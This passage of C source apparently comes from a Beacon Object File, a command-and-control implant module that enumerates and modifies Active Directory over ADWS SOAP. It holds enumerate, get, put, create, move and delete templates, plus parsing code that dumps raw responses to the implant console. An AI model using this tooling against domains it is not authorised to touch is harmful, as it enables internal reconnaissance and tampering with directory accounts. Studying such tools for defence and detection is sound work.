		" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">"
		"<s:Header>"
		"<a:Action s:mustUnderstand=\"1\">http://schemas.xmlsoap.org/ws/2004/09/enumeration/Enumerate</a:Action>"
		"<ad:instance>ldap:389</ad:instance>"
		"<a:MessageID>urn:uuid:{uuid}</a:MessageID>"
		"<a:ReplyTo><a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address></a:ReplyTo>"
		"<a:To s:mustUnderstand=\"1\">net.tcp://{fqdn}:9389/ActiveDirectoryWebServices/Windows/Enumeration</a:To>"
		"</s:Header>"
		"<s:Body xmlns:wsen=\"http://schemas.xmlsoap.org/ws/2004/09/enumeration\""
		" xmlns:adlq=\"http://schemas.microsoft.com/2008/1/ActiveDirectory/Dialect/LdapQuery\">"
		"<wsen:Enumerate>"
		"<wsen:Filter Dialect=\"http://schemas.microsoft.com/2008/1/ActiveDirectory/Dialect/LdapQuery\">"
		"<adlq:LdapQuery>"
		"<adlq:Filter>{query}</adlq:Filter>"
		"<adlq:BaseObject>{baseobj}</adlq:BaseObject>"
		"<adlq:Scope>{scope}</adlq:Scope>"
		"</adlq:LdapQuery>"
		"</wsen:Filter>"
		"</wsen:Enumerate>"
		"</s:Body>"
		"</s:Envelope>";
	static const char kPullTpl[] =
		"<s:Envelope"
		" xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\""
		" xmlns:a=\"http://www.w3.org/2005/08/addressing\""
		" xmlns:ad=\"http://schemas.microsoft.com/2008/1/ActiveDirectory\">"
		"<s:Header>"
		"<a:Action s:mustUnderstand=\"1\">http://schemas.xmlsoap.org/ws/2004/09/enumeration/Pull</a:Action>"
		"<ad:instance>ldap:389</ad:instance>"
		"<a:MessageID>urn:uuid:{uuid}</a:MessageID>"
		"<a:ReplyTo><a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address></a:ReplyTo>"
		"<a:To s:mustUnderstand=\"1\">net.tcp://{fqdn}:9389/ActiveDirectoryWebServices/Windows/Enumeration</a:To>"
		"</s:Header>"
		"<s:Body xmlns:wsen=\"http://schemas.xmlsoap.org/ws/2004/09/enumeration\""
		" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\""
		" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">"
		"<wsen:Pull>"
		"<wsen:EnumerationContext>{enum_ctx}</wsen:EnumerationContext>"
		"<wsen:MaxElements>{max_elements}</wsen:MaxElements>"
		"</wsen:Pull>"
		"</s:Body>"
		"</s:Envelope>";


	static const char kReleaseTpl[] =
		"<s:Envelope"
		" xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\""
		" xmlns:a=\"http://www.w3.org/2005/08/addressing\""
		" xmlns:ad=\"http://schemas.microsoft.com/2008/1/ActiveDirectory\">"
		"<s:Header>"
		"<a:Action s:mustUnderstand=\"1\">http://schemas.xmlsoap.org/ws/2004/09/enumeration/Release</a:Action>"
		"<ad:instance>ldap:389</ad:instance>"
		"<a:MessageID>urn:uuid:{uuid}</a:MessageID>"
		"<a:ReplyTo><a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address></a:ReplyTo>"
		"<a:To s:mustUnderstand=\"1\">net.tcp://{fqdn}:9389/ActiveDirectoryWebServices/Windows/Enumeration</a:To>"
		"</s:Header>"
		"<s:Body xmlns:wsen=\"http://schemas.xmlsoap.org/ws/2004/09/enumeration\">"
		"<wsen:Release>"
		"<wsen:EnumerationContext>{enum_ctx}</wsen:EnumerationContext>"
		"</wsen:Release>"
		"</s:Body>"
		"</s:Envelope>";

	static const char kGetTpl[] =
		"<s:Envelope"
		" xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\""
		" xmlns:a=\"http://www.w3.org/2005/08/addressing\""
		" xmlns:addata=\"http://schemas.microsoft.com/2008/1/ActiveDirectory/Data\""
		" xmlns:ad=\"http://schemas.microsoft.com/2008/1/ActiveDirectory\""
		" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\""
		" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">"
		"<s:Header>"
		"<a:Action s:mustUnderstand=\"1\">http://schemas.xmlsoap.org/ws/2004/09/transfer/Get</a:Action>"
		"<ad:instance>ldap:389</ad:instance>"
		"<a:MessageID>urn:uuid:{uuid}</a:MessageID>"
		"<a:ReplyTo><a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address></a:ReplyTo>"
		"<a:To s:mustUnderstand=\"1\">net.tcp://{fqdn}:9389/ActiveDirectoryWebServices/Windows/Resource</a:To>"
		"</s:Header>"
		"<s:Body>"
		"<addata:distinguishedName><addata:value>{dn}</addata:value></addata:distinguishedName>"
		"<ad:Selection Dialect=\"http://schemas.microsoft.com/2008/1/ActiveDirectory/Dialect/XPath-Level-1\">"
		"{attributes}"
		"</ad:Selection>"
		"</s:Body>"
		"</s:Envelope>";

	static const char kPutTpl[] =
		"<s:Envelope"
		" xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\""
		" xmlns:a=\"http://www.w3.org/2005/08/addressing\""
		" xmlns:addata=\"http://schemas.microsoft.com/2008/1/ActiveDirectory/Data\""
		" xmlns:ad=\"http://schemas.microsoft.com/2008/1/ActiveDirectory\""
		" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\""
		" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">"
		"<s:Header>"
		"<a:Action s:mustUnderstand=\"1\">http://schemas.xmlsoap.org/ws/2004/09/transfer/Put</a:Action>"
		"<ad:instance>ldap:389</ad:instance>"
		"<a:MessageID>urn:uuid:{uuid}</a:MessageID>"
		"<a:ReplyTo><a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address></a:ReplyTo>"
		"<a:To s:mustUnderstand=\"1\">net.tcp://{fqdn}:9389/ActiveDirectoryWebServices/Windows/Resource</a:To>"
		"</s:Header>"
		"<s:Body>"
		"<addata:distinguishedName><addata:value>{dn}</addata:value></addata:distinguishedName>"
		"{attributes}"
		"</s:Body>"
		"</s:Envelope>";

	static const char kDeleteTpl[] =
		"<s:Envelope"
		" xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\""
		" xmlns:a=\"http://www.w3.org/2005/08/addressing\""
		" xmlns:addata=\"http://schemas.microsoft.com/2008/1/ActiveDirectory/Data\""
		" xmlns:ad=\"http://schemas.microsoft.com/2008/1/ActiveDirectory\">"
		"<s:Header>"
		"<a:Action s:mustUnderstand=\"1\">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</a:Action>"
		"<ad:instance>ldap:389</ad:instance>"
		"<a:MessageID>urn:uuid:{uuid}</a:MessageID>"
		"<a:ReplyTo><a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address></a:ReplyTo>"
		"<a:To s:mustUnderstand=\"1\">net.tcp://{fqdn}:9389/ActiveDirectoryWebServices/Windows/Resource</a:To>"
		"</s:Header>"
		"<s:Body>"
		"<addata:distinguishedName><addata:value>{dn}</addata:value></addata:distinguishedName>"
		"</s:Body>"
		"</s:Envelope>";

	static const char kCreateTpl[] =
		"<s:Envelope"
		" xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\""
		" xmlns:a=\"http://www.w3.org/2005/08/addressing\""
		" xmlns:addata=\"http://schemas.microsoft.com/2008/1/ActiveDirectory/Data\""
		" xmlns:ad=\"http://schemas.microsoft.com/2008/1/ActiveDirectory\""
		" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\""
		" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">"
		"<s:Header>"
		"<a:Action s:mustUnderstand=\"1\">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action>"
		"<ad:instance>ldap:389</ad:instance>"
		"<a:MessageID>urn:uuid:{uuid}</a:MessageID>"
		"<a:ReplyTo><a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address></a:ReplyTo>"
		"<a:To s:mustUnderstand=\"1\">net.tcp://{fqdn}:9389/ActiveDirectoryWebServices/Windows/ResourceFactory</a:To>"
		"</s:Header>"
		"<s:Body>"
		"<addata:distinguishedName><addata:value>{dn}</addata:value></addata:distinguishedName>"
		"<addata:objectClass><addata:value>{object_class}</addata:value></addata:objectClass>"
		"{attributes}"
		"</s:Body>"
		"</s:Envelope>";

	static const char kMoveTpl[] =
		"<s:Envelope"
		" xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\""
		" xmlns:a=\"http://www.w3.org/2005/08/addressing\""
		" xmlns:addata=\"http://schemas.microsoft.com/2008/1/ActiveDirectory/Data\""
		" xmlns:ad=\"http://schemas.microsoft.com/2008/1/ActiveDirectory\""
		" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\""
		" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">"
		"<s:Header>"
		"<a:Action s:mustUnderstand=\"1\">http://schemas.xmlsoap.org/ws/2004/09/transfer/Put</a:Action>"
		"<ad:instance>ldap:389</ad:instance>"
		"<a:MessageID>urn:uuid:{uuid}</a:MessageID>"
		"<a:ReplyTo><a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address></a:ReplyTo>"
		"<a:To s:mustUnderstand=\"1\">net.tcp://{fqdn}:9389/ActiveDirectoryWebServices/Windows/Resource</a:To>"
		"</s:Header>"
		"<s:Body>"
		"<addata:distinguishedName><addata:value>{current_dn}</addata:value></addata:distinguishedName>"
		"<addata:distinguishedName><addata:value>{new_dn}</addata:value></addata:distinguishedName>"
		"</s:Body>"
		"</s:Envelope>";

	/* ─── ADWS operations ---──────────────────── */

	/* Build attribute XML list for Enumerate / Get */
	static char* build_attr_list(const char** attrs, int n) {
		Buf b = buf_new();
		for (int i = 0;i < n;i++) {
			buf_append_str(&b, "<ad:SelectionProperty>addata:");

			buf_append_str(&b, attrs[i]);
			buf_append_str(&b, "</ad:SelectionProperty>");
		}
		buf_push(&b, 0);
		return (char*)b.data;
	}

	/* Build a single attribute modification XML fragment */
	static char* build_mod_xml(const char* name, const char* const* values, int n_values,
		const u8* const* bytes, const size_t* byte_lens, int n_bytes,
		int op /* 0=replace 1=add 2=delete */) {
		if (!name || !*name) return NULL;
		Buf b = buf_new();
		buf_append_str(&b, "<addata:"); buf_append_str(&b, name);
		if (n_values == 0 && n_bytes == 0) {
			buf_append_str(&b, " xsi:nil=\"true\"/>"); goto done;
		}
		switch (op) {
		case 1: buf_append_str(&b, " ad:changeOperation=\"add\""); break;
		case 2: buf_append_str(&b, " ad:changeOperation=\"delete\""); break;
		default: break;
		}
		buf_push(&b, '>');
		for (int i = 0;i < n_values;i++) {
			buf_append_str(&b, "<addata:value>");
			Buf esc = buf_new(); xml_escape_str(&esc, values[i], adws_strlen(values[i]));
			buf_append(&b, esc.data, esc.len); buf_free(&esc);
			buf_append_str(&b, "</addata:value>");
		}
		for (int i = 0;i < n_bytes;i++) {
			buf_append_str(&b, "<addata:value xsi:type=\"xsd:base64Binary\">");
			base64_encode(&b, bytes[i], byte_lens[i]);
			buf_append_str(&b, "</addata:value>");
		}
		buf_append_str(&b, "</addata:"); buf_append_str(&b, name); buf_push(&b, '>');
	done:
		buf_push(&b, 0); return (char*)b.data;
	}

	/* Parse an LdapObject XML node (child element of Items or Body in response) */
	static AdwsObject parse_object_node(char* node_xml, char* node_end) {
		AdwsObject obj; adws_memset(&obj, 0, sizeof(obj));
		char* p = node_xml;

		/* skip the outer element opening tag */
		while (p < node_end && *p != '>') p++;
		if (p >= node_end) return obj;
		p++; /* past '>' */

		while (p < node_end) {
			/* skip whitespace */
			while (p < node_end && (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r')) p++;
			if (p >= node_end || *p != '<') break;
			if (p[1] == '/') break; /* closing tag of outer element */
			if (p[1] == '!' || p[1] == '?') {
				while (p < node_end && *p != '>') p++;
				if (p < node_end) p++;
				continue;
			}

			/* read this attribute element's local name */
			char* tag = p + 1;
			/* skip prefix */
			char* colon = tag;
			while (colon < node_end && *colon != ':' && *colon != '>' && *colon != ' ' && *colon != '/') colon++;
			char* local = (*colon == ':') ? colon + 1 : tag;
			char attr_name[256] = { 0 };
			size_t nl = 0;
			while (local[nl] && local[nl] != '>' && local[nl] != ' ' && local[nl] != '/' && nl < 255) {
				attr_name[nl] = local[nl];
				nl++;
			}
			attr_name[nl] = 0;

			/* skip to end of opening tag */
			while (p < node_end && *p != '>') p++;
			if (p >= node_end) break;
			int self_close = (p > node_xml && *(p - 1) == '/');
			p++; /* past '>' */

			AdwsAttr attr; adws_memset(&attr, 0, sizeof(attr));
			size_t an_len = adws_strlen(attr_name) + 1;
			attr.name = (char*)adws_alloc(an_len);
			adws_memcpy(attr.name, attr_name, an_len);

			if (!self_close) {
				/* find matching close tag for this attribute element using depth tracking */
				char* cp = p;
				int depth = 1;
				while (cp < node_end && depth > 0) {
					while (cp < node_end && *cp != '<') cp++;
					if (cp >= node_end) break;
					cp++;
					if (cp >= node_end) break;

					int is_close = (*cp == '/');
					if (is_close) cp++;

					/* read local name of this tag */
					char* tcolon = cp;
					while (tcolon < node_end && *tcolon != ':' && *tcolon != '>' && *tcolon != ' ' && *tcolon != '/') tcolon++;
					char* tlocal = (*tcolon == ':') ? tcolon + 1 : cp;
					char tname[128] = { 0 };
					size_t tnl = 0;
					while (tlocal[tnl] && tlocal[tnl] != '>' && tlocal[tnl] != ' ' && tlocal[tnl] != '/' && tnl < 127) {
						tname[tnl] = tlocal[tnl];
						tnl++;
					}
					tname[tnl] = 0;

					/* skip to end of tag */
					int tag_self_close = 0;
					while (cp < node_end && *cp != '>') {
						if (*cp == '/') tag_self_close = 1;
						cp++;
					}
					if (cp < node_end) cp++; /* past '>' */

					if (tag_self_close) {
						/* self-closing tag doesn't change depth */
					}
					else if (is_close) {
						depth--;
					}
					else {
						depth++;
					}

					/* if this is a <value> child at depth 1, extract its text */
					if (!is_close && !tag_self_close && depth == 2 &&
						tnl >= 5 && adws_memcmp(tname, "value", 5) == 0) {
						const char* tstart = cp;
						while (cp < node_end && *cp != '<') cp++;
						size_t tlen = (size_t)(cp - tstart);
						char* tv = (char*)adws_alloc(tlen + 1);
						adws_memcpy(tv, tstart, tlen); tv[tlen] = 0;
						xml_unescape_inplace(tv, &tlen); tv[tlen] = 0;
						attr.values = (char**)adws_realloc(attr.values,
							attr.value_count * sizeof(char*),
							(attr.value_count + 1) * sizeof(char*));
						attr.values[attr.value_count++] = tv;
					}
				}
				p = cp;
			}

			/* add attr to object */
			obj.attrs = (AdwsAttr*)adws_realloc(obj.attrs,
				obj.attr_count * sizeof(AdwsAttr),
				(obj.attr_count + 1) * sizeof(AdwsAttr));
			obj.attrs[obj.attr_count++] = attr;
		}
		return obj;
	}

	/* Free an AdwsObject */
	static void free_object(AdwsObject* obj) {
		for (size_t i = 0;i < obj->attr_count;i++) {
			adws_free(obj->attrs[i].name);
			for (size_t j = 0;j < obj->attrs[i].value_count;j++) adws_free(obj->attrs[i].values[j]);
			adws_free(obj->attrs[i].values);
			for (size_t j = 0;j < obj->attrs[i].byte_count;j++) adws_free(obj->attrs[i].bytes[j]);
			adws_free(obj->attrs[i].bytes); adws_free(obj->attrs[i].byte_lens);
		}
		adws_free(obj->attrs);
	}

	void adws_result_free(AdwsResult* r) {
		if (!r) return;
		for (size_t i = 0;i < r->count;i++) free_object(&r->objects[i]);
		adws_free(r->objects); adws_free(r);
	}

	/* Get first value of named attribute from an object (case-insensitive) */
	const char* adws_attr_value(const AdwsObject* obj, const char* name) {
		for (size_t i = 0;i < obj->attr_count;i++) {
			if (adws_strcasecmp(obj->attrs[i].name, name) == 0) {
				if (obj->attrs[i].value_count) return obj->attrs[i].values[0];
			}
		}
		return NULL;
	}

	/* ── Enumerate ---───────────────────────────── */

	typedef int (*AdwsCallback)(const AdwsObject* obj, void* userdata);

	int adws_enumerate(
		AdwsClient* c,
		const char* ldap_filter,
		const char** attributes,
		const char* base_dn,
		AdwsCallback callback,
		void* userdata,
		u32 max_elements)
	{
		if (!max_elements) max_elements = 256;

		int nattr = 0;
		if (attributes) while (attributes[nattr]) nattr++;

		char uuid[37]; generate_uuid(uuid);
		const char* scope_str = "Subtree";
		char* enum_xml = NULL;

		if (!attributes || nattr == 0) {
			const char* kvs[] = {
				"uuid",    uuid,
				"fqdn",    c->fqdn,
				"query",   ldap_filter ? ldap_filter : "(objectClass=*)",
				"baseobj", base_dn ? base_dn : "",
				"scope",   scope_str
			};
			enum_xml = tpl_fill(kEnumTplNoAttr, kvs, 10);
		}
		else {
			char* attr_xml = build_attr_list(attributes, nattr);
			if (!attr_xml) return FALSE;
			const char* kvs[] = {
				"uuid",       uuid,
				"fqdn",       c->fqdn,
				"query",      ldap_filter ? ldap_filter : "(objectClass=*)",
				"baseobj",    base_dn ? base_dn : "",
				"scope",      scope_str,
				"attributes", attr_xml
			};
			enum_xml = tpl_fill(kEnumTpl, kvs, 12);
			adws_free(attr_xml);
		}
		if (!enum_xml) return FALSE;

		if (!adws_send_request(c, enum_xml)) { adws_free(enum_xml); return FALSE; }
		adws_free(enum_xml);

		char* resp = adws_recv_response(c);
		if (!resp) return FALSE;

		AdwsError err; adws_memset(&err, 0, sizeof(err));
		if (!check_soap_fault(resp, &err)) {

			adws_free(resp); adws_free(err.code); adws_free(err.reason); return FALSE;
		}

		char* enum_ctx = xml_get_text(resp, "EnumerationContext");
		adws_free(resp);
		if (!enum_ctx) { return FALSE; }


		int stopped = FALSE, end_of_seq = FALSE, ok = TRUE;
		Buf raw_responses[64];
		int raw_count = 0;
		adws_memset(raw_responses, 0, sizeof(raw_responses));

		while (!end_of_seq && raw_count < 64) {
			char uuid2[37]; generate_uuid(uuid2);
			char maxel_buf[12]; u32_to_str(max_elements, maxel_buf, sizeof(maxel_buf));
			const char* pkvs[] = {
				"uuid", uuid2, "fqdn", c->fqdn,
				"enum_ctx", enum_ctx, "max_elements", maxel_buf
			};
			char* pull_xml = tpl_fill(kPullTpl, pkvs, 8);
			if (!pull_xml) break;
			ok = adws_send_request(c, pull_xml); adws_free(pull_xml);
			if (!ok) break;

			raw_responses[raw_count] = adws_recv_raw(c);
			if (!raw_responses[raw_count].data) break;
			raw_count++;

			/* if small response, decode to check for EOS or fault */
			if (raw_responses[raw_count - 1].len < 2000) {
				Buf xml = buf_new();

				nbfse_decode(raw_responses[raw_count - 1].data, raw_responses[raw_count - 1].len, &xml);
				char* decoded = (char*)xml.data;
				if (decoded) {
					if (xml_find_tag(decoded, "EndOfSequence", 0)) end_of_seq = TRUE;
					if (xml_find_tag(decoded, "Fault", 0)) { end_of_seq = TRUE; buf_free(&xml); break; }
				}
				buf_free(&xml);
			}
		}

		/* now decode and process all collected responses */
		AdwsResult* r = (AdwsResult*)userdata;

		for (int ri = 0; ri < raw_count && !stopped; ri++) {

			if (!raw_responses[ri].data) continue;

			Buf xml = buf_new();
			nbfse_decode(raw_responses[ri].data, raw_responses[ri].len, &xml);
			char* presp = (char*)xml.data;
			if (presp) {
				size_t plen = adws_strlen(presp);
				BeaconPrintf(CALLBACK_OUTPUT, "=== RAW DECODED XML (len=%llu) ===\n", plen);
				for (size_t pi = 0; pi < plen; pi += 400) {
					size_t chunk = plen - pi < 400 ? plen - pi : 400;
					char tmp[401];
					adws_memcpy(tmp, presp + pi, chunk);
					tmp[chunk] = 0;
					BeaconPrintf(CALLBACK_OUTPUT, "%s", tmp);
				}
			}
			buf_free(&raw_responses[ri]);
			if (!presp) continue;
			if (ri == 0) {
				size_t plen = adws_strlen(presp);

				for (size_t pi = 0; pi < plen && pi < 5000; pi += 300) {
					char tmp[301]; size_t chunk = plen - pi; if (chunk > 300) chunk = 300;
					adws_memcpy(tmp, presp + pi, chunk); tmp[chunk] = 0;

				}
			}
			if (xml_find_tag(presp, "EndOfSequence", 0)) end_of_seq = TRUE;

			char* items_open = xml_find_tag(presp, "Items", 0);
			if (items_open) {
				while (*items_open && *items_open != '>') items_open++;
				if (!*items_open) { adws_free(presp); continue; }
				char* ip = items_open + 1;
				int obj_count = 0;

				while (*ip) {
					while (*ip == ' ' || *ip == '\t' || *ip == '\n' || *ip == '\r') ip++;
					if (!*ip || *ip != '<') break;

					if (ip[1] == '/') {
						char* ct = ip + 2;
						while (*ct && *ct != ':' && *ct != '>' && *ct != ' ') ct++;
						if (*ct == ':') ct++;
						char close_name[64] = { 0 };
						size_t cn = 0;
						while (ct[cn] && ct[cn] != '>' && ct[cn] != ' ' && cn < 63) {
							close_name[cn] = ct[cn]; cn++;
						}
						close_name[cn] = 0;
						if (adws_strcmp(close_name, "Items") == 0 ||
							adws_strcmp(close_name, "PullResponse") == 0) break;
						while (*ip && *ip != '>') ip++;
						if (*ip) ip++;
						continue;
					}

					char* tag_start = ip + 1;
					char* colon = tag_start;
					while (*colon && *colon != ':' && *colon != '>' && *colon != ' ') colon++;
					char* local_start = (*colon == ':') ? colon + 1 : tag_start;
					char obj_name[64] = { 0 };
					size_t nl = 0;
					while (local_start[nl] && local_start[nl] != '>' &&
						local_start[nl] != ' ' && local_start[nl] != '/' && nl < 63) {
						obj_name[nl] = local_start[nl];
						nl++;
					}
					obj_name[nl] = 0;

					/* skip unknown/garbage element names — treat as continuation wrapper */
					if (obj_name[0] == '?') {
						/* This is a continuation frame for the previous object */
						char* content_start = ip;
						/* skip past the opening tag */
						while (*content_start && *content_start != '>') content_start++;
						if (*content_start) content_start++;

						/* find closing </m:?> */
						char* content_end = content_start;
						while (*content_end) {
							if (*content_end == '<' && content_end[1] == '/') {
								/* check if this closes the '?' element */
								char* ct = content_end + 2;
								while (*ct && *ct != ':' && *ct != '>' && *ct != ' ') ct++;
								if (*ct == ':') ct++;
								if (*ct == '?' && (ct[1] == '>' || ct[1] == ' ')) {
									break;
								}
							}
							content_end++;
						}

						/* Only merge if we have an existing object */
						if (r && r->count > 0) {
							/* Wrap the content in a fake element so parse_object_node can handle it */
							Buf fake = buf_new();
							buf_append_str(&fake, "<addata:continuation>");
							buf_append(&fake, (const u8*)content_start,
								(size_t)(content_end - content_start));
							buf_append_str(&fake, "</addata:continuation>");
							buf_push(&fake, 0);

							AdwsObject extra = parse_object_node(
								(char*)fake.data,
								(char*)fake.data + fake.len
							);

							AdwsObject* last = &r->objects[r->count - 1];
							for (size_t ei = 0; ei < extra.attr_count; ei++) {
								AdwsAttr* src = &extra.attrs[ei];
								if (src->value_count == 0) {
									adws_free(src->name);
									continue;
								}

								/* Check if attribute already exists on the object */
								int found = 0;
								for (size_t li = 0; li < last->attr_count; li++) {
									if (adws_strcasecmp(last->attrs[li].name, src->name) == 0) {
										found = 1;
										/* Append values */
										for (size_t v = 0; v < src->value_count; v++) {
											last->attrs[li].values = (char**)adws_realloc(
												last->attrs[li].values,
												last->attrs[li].value_count * sizeof(char*),
												(last->attrs[li].value_count + 1) * sizeof(char*)
											);
											last->attrs[li].values[last->attrs[li].value_count++] =
												src->values[v];
											src->values[v] = NULL; /* transferred ownership */
										}
										adws_free(src->name);
										adws_free(src->values);
										break;
									}
								}

								if (!found) {
									/* New attribute — add it */
									last->attrs = (AdwsAttr*)adws_realloc(
										last->attrs,
										last->attr_count * sizeof(AdwsAttr),
										(last->attr_count + 1) * sizeof(AdwsAttr)
									);
									last->attrs[last->attr_count++] = *src;
									adws_memset(src, 0, sizeof(*src));
								}
							}
							adws_free(extra.attrs);
							buf_free(&fake);
						}

						/* Advance ip past the closing tag */
						while (*content_end && *content_end != '>') content_end++;
						if (*content_end) content_end++;
						ip = content_end;
						continue;
					}

					if (!obj_name[0]) break;

					if (adws_strcmp(obj_name, "user") != 0 &&
						adws_strcmp(obj_name, "computer") != 0 &&
						adws_strcmp(obj_name, "group") != 0 &&
						adws_strcmp(obj_name, "contact") != 0 &&
						adws_strcmp(obj_name, "organizationalUnit") != 0 &&
						adws_strcmp(obj_name, "container") != 0 &&
						adws_strcmp(obj_name, "domainDNS") != 0) {
						while (*ip && *ip != '>') ip++;
						if (*ip) ip++;
						continue;
					}

					char* obj_close = xml_find_tag(ip + 1, obj_name, 1);
					if (!obj_close) break;
					char* obj_end = obj_close;
					while (*obj_end && *obj_end != '>') obj_end++;
					if (*obj_end) obj_end++;

					AdwsObject obj = parse_object_node(ip, obj_end);
					obj_count++;
					if (!callback(&obj, userdata)) { stopped = TRUE; free_object(&obj); break; }
					free_object(&obj);
					ip = obj_end;
				}
			}
			adws_free(presp);
		}

		/* release if stopped early */
		if (stopped && !end_of_seq) {
			char uuid3[37]; generate_uuid(uuid3);
			const char* rkvs[] = { "uuid", uuid3, "fqdn", c->fqdn, "enum_ctx", enum_ctx };
			char* rel_xml = tpl_fill(kReleaseTpl, rkvs, 6);
			if (rel_xml) {
				adws_send_request(c, rel_xml); adws_free(rel_xml);
				char* rresp = adws_recv_response(c); adws_free(rresp);
			}
		}

		adws_free(enum_ctx);
		return ok;
	}

	static int collect_callback(const AdwsObject* obj, void* ud) {
		AdwsResult* r = (AdwsResult*)ud;

		/* check if we already have an object with the same distinguishedName */
		const char* dn = adws_attr_value(obj, "distinguishedName");
		if (!dn) dn = adws_attr_value(obj, "name");
		if (dn) {
			for (size_t i = 0; i < r->count; i++) {
				const char* edn = adws_attr_value(&r->objects[i], "distinguishedName");
				if (!edn) edn = adws_attr_value(&r->objects[i], "name");
				if (edn && adws_strcasecmp(dn, edn) == 0) {
					/* merge attrs into existing object */
					for (size_t j = 0; j < obj->attr_count; j++) {
						const AdwsAttr* src = &obj->attrs[j];
						/* check if attr already exists */
						int found = 0;
						for (size_t k = 0; k < r->objects[i].attr_count; k++) {
							if (adws_strcasecmp(r->objects[i].attrs[k].name, src->name) == 0) {
								found = 1;
								/* append values */
								for (size_t v = 0; v < src->value_count; v++) {
									size_t vl = adws_strlen(src->values[v]) + 1;
									char* vc = (char*)adws_alloc(vl);
									adws_memcpy(vc, src->values[v], vl);
									r->objects[i].attrs[k].values = (char**)adws_realloc(
										r->objects[i].attrs[k].values,
										r->objects[i].attrs[k].value_count * sizeof(char*),
										(r->objects[i].attrs[k].value_count + 1) * sizeof(char*));
									r->objects[i].attrs[k].values[r->objects[i].attrs[k].value_count++] = vc;
								}
								break;
							}
						}
						if (!found && src->value_count > 0) {
							/* add new attr */
							AdwsAttr na; adws_memset(&na, 0, sizeof(na));
							size_t nl = adws_strlen(src->name) + 1;
							na.name = (char*)adws_alloc(nl);
							adws_memcpy(na.name, src->name, nl);
							na.value_count = src->value_count;
							na.values = (char**)adws_alloc(src->value_count * sizeof(char*));
							adws_memset(na.values, 0, src->value_count * sizeof(char*));
							for (size_t v = 0; v < src->value_count; v++) {
								size_t vl = adws_strlen(src->values[v]) + 1;
								na.values[v] = (char*)adws_alloc(vl);
								adws_memcpy(na.values[v], src->values[v], vl);
							}
							r->objects[i].attrs = (AdwsAttr*)adws_realloc(
								r->objects[i].attrs,
								r->objects[i].attr_count * sizeof(AdwsAttr),
								(r->objects[i].attr_count + 1) * sizeof(AdwsAttr));
							r->objects[i].attrs[r->objects[i].attr_count++] = na;
						}
					}
					return TRUE; /* merged, don't add new object */
				}
			}
		}

		/* new object — grow array if needed */
		if (r->count >= r->cap) {
			size_t newcap = r->cap ? r->cap * 2 : 16;
			AdwsObject* p;
			if (r->objects) {
				p = (AdwsObject*)adws_realloc(r->objects, r->cap * sizeof(AdwsObject), newcap * sizeof(AdwsObject));
			}
			else {
				p = (AdwsObject*)adws_alloc(newcap * sizeof(AdwsObject));
			}
			if (!p) return FALSE;
			r->objects = p;
			r->cap = newcap;
		}

		AdwsObject copy;
		adws_memset(&copy, 0, sizeof(copy));
		copy.attr_count = obj->attr_count;

		if (obj->attr_count > 0) {
			copy.attrs = (AdwsAttr*)adws_alloc(obj->attr_count * sizeof(AdwsAttr));
			if (!copy.attrs) return FALSE;
			adws_memset(copy.attrs, 0, obj->attr_count * sizeof(AdwsAttr));

			for (size_t i = 0; i < obj->attr_count; i++) {
				const AdwsAttr* src = &obj->attrs[i];
				AdwsAttr* dst = &copy.attrs[i];
				size_t nl = adws_strlen(src->name) + 1;
				dst->name = (char*)adws_alloc(nl);
				if (!dst->name) return FALSE;
				adws_memcpy(dst->name, src->name, nl);
				dst->value_count = src->value_count;
				if (src->value_count > 0) {
					dst->values = (char**)adws_alloc(src->value_count * sizeof(char*));
					if (!dst->values) return FALSE;
					adws_memset(dst->values, 0, src->value_count * sizeof(char*));
					for (size_t j = 0; j < src->value_count; j++) {
						size_t vl = adws_strlen(src->values[j]) + 1;
						dst->values[j] = (char*)adws_alloc(vl);
						if (!dst->values[j]) return FALSE;
						adws_memcpy(dst->values[j], src->values[j], vl);
					}
				}
			}
		}

		r->objects[r->count++] = copy;
		return TRUE;
	}

	/* ── Get ------── */

	AdwsObject* adws_get(AdwsClient* c, const char* dn, const char** attributes) {
		int nattr = 0; if (attributes) while (attributes[nattr]) nattr++;
		char* attr_xml = build_attr_list(attributes, nattr);
		if (!attr_xml) return NULL;

		char uuid[37]; generate_uuid(uuid);
		Buf dn_esc = buf_new(); xml_escape_str(&dn_esc, dn, adws_strlen(dn)); buf_push(&dn_esc, 0);

		const char* kvs[] = { "uuid",uuid,"fqdn",c->fqdn,"dn",(char*)dn_esc.data,"attributes",attr_xml };
		char* xml = tpl_fill(kGetTpl, kvs, 8);
		buf_free(&dn_esc); adws_free(attr_xml);
		if (!xml) return NULL;

		int ok = adws_send_request(c, xml); adws_free(xml);
		if (!ok) return NULL;

		char* resp = adws_recv_response(c);
		if (!resp) return NULL;

		AdwsError err; adws_memset(&err, 0, sizeof(err));
		if (!check_soap_fault(resp, &err)) {
			adws_free(resp); adws_free(err.code); adws_free(err.reason); return NULL;
		}

		char* body = xml_find_tag(resp, "Body", 0);
		AdwsObject* obj = (AdwsObject*)adws_alloc(sizeof(AdwsObject));

